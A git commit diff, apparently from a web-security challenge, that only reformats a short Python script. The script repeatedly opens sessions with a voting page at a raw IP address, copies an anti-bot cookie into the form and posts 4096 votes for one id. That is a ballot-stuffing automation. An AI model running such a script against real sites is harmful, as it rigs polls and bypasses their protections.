8b5b3f6f5ca149c556753095232e261953d38ffe
Anthony <huggins9000211@gmail.com>
2020-01-16 10:53:07 -0500

    test

--- level_1/script.py
+++ level_1/script.py
@@ -1,10 +1,10 @@
 #!/usr/bin/python3
 import requests
 ENDPOINT = "http://158.69.76.135/level1.php"
-data = {"id" : "830", "holdthedoor" : "Submit+Query"}
+data = {"id": "830", "holdthedoor": "Submit+Query"}
 for i in range(0, 4096):
-	session = requests.Session()
-	session.get(ENDPOINT)
-	key = session.cookies.get_dict()
-	data["key"] = key['HoldTheDoor']
-	session.post(url = ENDPOINT, data = data)
+    session = requests.Session()
+    session.get(ENDPOINT)
+    key = session.cookies.get_dict()
+    data["key"] = key['HoldTheDoor']
+    session.post(url=ENDPOINT, data=data)
